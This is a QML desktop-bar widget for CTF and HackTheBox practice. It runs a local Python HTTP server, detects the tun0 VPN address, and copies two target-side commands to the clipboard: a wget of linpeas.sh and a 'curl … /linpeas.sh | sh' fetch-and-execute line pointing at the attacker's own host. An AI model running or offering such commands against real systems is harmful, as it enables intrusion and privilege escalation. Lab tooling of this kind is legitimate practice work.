import QtQuick
import Quickshell
import Quickshell.Io
import qs.Commons
import qs.Commons as Commons
import qs.Ui

Panel {
  id: root
  moduleName: "raqune.web-spawner"
  implicitWidth: button.implicitWidth
  implicitHeight: button.implicitHeight

  readonly property string statePath: Quickshell.env("HOME") + "/.local/state/omarchy/ctf/web-spawner.json"
  property bool serverRunning: false
  property string serverPort: "8000"
  property string serveDir: "~/htb"
  property string tun0Ip: "127.0.0.1"

  FileView {
    id: configFile
    path: root.statePath
    watchChanges: true
    printErrors: false
    onLoaded: {
      try {
        var data = JSON.parse(text())
        if (data && data.dir) root.serveDir = data.dir
        if (data && data.port) root.serverPort = data.port
      } catch(e) {}
    }
    onFileChanged: reload()
  }

  Process {
    id: statusCheck
    command: ["sh", "-c", "pgrep -fa 'python3 -m http.server' | grep -v grep || true"]
    running: false
    stdout: StdioCollector {
      waitForEnd: true
      onStreamFinished: { root.serverRunning = text.trim() !== "" }
    }
  }

  Process {
    id: tunCheck
    command: ["sh", "-c", "ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' || echo '127.0.0.1'"]
    running: false
    stdout: StdioCollector {
      waitForEnd: true
      onStreamFinished: {
        var ip = text.trim()
        root.tun0Ip = ip !== "" ? ip : "127.0.0.1"
      }
    }
  }

  Process {
    id: folderPicker
    running: false
    stdout: StdioCollector {
      waitForEnd: true
      onStreamFinished: {
        var selected = text.trim()
        if (selected !== "") {
          root.setServeDir(selected)
        }
      }
    }
  }

  Timer {
    interval: 2500
    running: true
    repeat: true
    triggeredOnStart: true
    onTriggered: {
      if (!statusCheck.running) statusCheck.running = true
      if (!tunCheck.running) tunCheck.running = true
    }
  }

  function resolvePath(p) {
    if (!p) return Quickshell.env("HOME") + "/htb"
    var clean = p.trim()
    if (clean.indexOf("~/") === 0) {
      return Quickshell.env("HOME") + clean.substring(1)
    } else if (clean === "~") {
      return Quickshell.env("HOME")
    }
    return clean
  }

  function saveConfig() {
    configFile.setText(JSON.stringify({ dir: root.serveDir, port: root.serverPort }) + "\n")
  }

  function setServeDir(p) {
    var clean = p.trim()
    if (clean === "") clean = "~/htb"
    var changed = (root.serveDir !== clean)
    root.serveDir = clean
    saveConfig()
    if (changed && root.serverRunning) {
      restartServer()
    }
  }

  function openFolderPicker() {
    folderPicker.command = ["sh", "-c", "zenity --file-selection --directory --title='Select Directory to Serve' --filename=\"$1/\" 2>/dev/null || zenity --file-selection --directory --title='Select Directory to Serve' 2>/dev/null || true", "zenity", resolvePath(root.serveDir)]
    folderPicker.running = true
  }

  function startServer() {
    var resolved = resolvePath(root.serveDir)
    Util.execArgv(["sh", "-c", "mkdir -p \"$1\" && setsid python3 -m http.server \"$2\" -d \"$1\" >/dev/null 2>&1 & omarchy-notification-send 'Web Spawner' \"Serving $3 on port $2\"", "spawn", resolved, root.serverPort, root.serveDir])
    root.serverRunning = true
    statusCheck.running = true
  }

  function stopServer() {
    Util.execArgv(["sh", "-c", "pkill -f 'python3 -m http.server'; omarchy-notification-send 'Web Spawner' 'HTTP Server stopped'"])
    root.serverRunning = false
    statusCheck.running = true
  }

  function restartServer() {
    var resolved = resolvePath(root.serveDir)
    Util.execArgv(["sh", "-c", "pkill -f 'python3 -m http.server'; sleep 0.2; mkdir -p \"$1\" && setsid python3 -m http.server \"$2\" -d \"$1\" >/dev/null 2>&1 & omarchy-notification-send 'Web Spawner' \"Restarted: serving $3 on port $2\"", "restart", resolved, root.serverPort, root.serveDir])
    root.serverRunning = true
    statusCheck.running = true
  }

  function toggleServer() {
    if (root.serverRunning) {
      stopServer()
    } else {
      startServer()
    }
  }

  function copyCmd(cmd) {
    Util.execArgv(["sh", "-c", "printf '%s' \"$1\" | wl-copy && omarchy-notification-send 'Web Spawner' \"Copied: $1\"", "copy", cmd])
  }

  BarIconButton {
    id: button
    anchors.fill: parent
    bar: root.bar
    slotSize: Style.bar.statusSlot
    tooltipText: root.serverRunning ? ("Web Spawner: :" + root.serverPort + " LIVE (" + root.serveDir + ")") : ("Web Spawner (Idle: " + root.serveDir + ")")
    iconComponent: Component {
      Image {
        cache: false
        source: Qt.resolvedUrl("web-spawner-cad.svg")
        fillMode: Image.PreserveAspectFit
        smooth: true
      }
    }
    onPressed: function(b) {
      if (b === Qt.RightButton) root.toggleServer()
      else root.toggle()
    }
  }

  KeyboardPanel {
    id: panel
    anchorItem: button
    owner: root
    bar: root.bar
    open: root.opened
    focusTarget: keyCatcher
    contentWidth: panel.fittedContentWidth(Style.space(340))
    contentHeight: panel.fittedContentHeight(column.implicitHeight)

    PanelKeyCatcher {
      id: keyCatcher
      anchors.fill: parent
      onCloseRequested: root.close()
      onTabRequested: function(direction) { root.switchPanel(direction) }

      Connections {
        target: root
        function onServeDirChanged() {
          if (dirInput.text !== root.serveDir) {
            dirInput.text = root.serveDir
          }
        }
      }

      Column {
        id: column
        anchors.left: parent.left
        anchors.right: parent.right
        anchors.top: parent.top
        spacing: Style.space(12)

        PanelHero {
          width: parent.width
          title: "CTF Web Spawner"
          meta: root.serverRunning ? ("SERVING " + root.serveDir + " ON :" + root.serverPort) : ("DIR: " + root.serveDir)
          detail: root.serverRunning ? "ONLINE" : "IDLE"
          foreground: Commons.Color.foreground
          iconComponent: Component {
            Image {
              width: Style.space(24)
              height: Style.space(24)
              cache: false
              source: Qt.resolvedUrl("web-spawner-cad.svg")
              fillMode: Image.PreserveAspectFit
            }
          }
        }

        PanelSeparator { foreground: Commons.Color.foreground }

        Row {
          width: parent.width
          spacing: Style.space(8)

          TextField {
            id: dirInput
            width: parent.width - setBtn.width - browseBtn.width - 2 * Style.space(8)
            text: root.serveDir
            placeholderText: "~/htb"
            onAccepted: root.setServeDir(text)
          }

          Button {
            id: setBtn
            width: Style.space(48)
            text: "Set"
            bordered: true
            onClicked: root.setServeDir(dirInput.text)
          }

          Button {
            id: browseBtn
            width: Style.space(70)
            text: "Browse"
            bordered: true
            onClicked: root.openFolderPicker()
          }
        }

        Row {
          width: parent.width
          spacing: Style.space(8)

          Button {
            width: parent.width
            text: root.serverRunning ? ("Stop HTTP Server (:" + root.serverPort + ")") : ("Start HTTP Server (:" + root.serverPort + ")")
            bordered: true
            selected: root.serverRunning
            onClicked: root.toggleServer()
          }
        }

        Row {
          width: parent.width
          spacing: Style.space(8)

          Button {
            width: Math.floor((parent.width - Style.space(8)) / 2)
            text: "Copy wget linpeas"
            bordered: true
            onClicked: root.copyCmd("wget http://" + root.tun0Ip + ":" + root.serverPort + "/linpeas.sh")
          }

          Button {
            width: parent.width - Math.floor((parent.width - Style.space(8)) / 2) - Style.space(8)
            text: "Copy curl | sh"
            bordered: true
            onClicked: root.copyCmd("curl -s http://" + root.tun0Ip + ":" + root.serverPort + "/linpeas.sh | sh")
          }
        }
      }
    }
  }
}
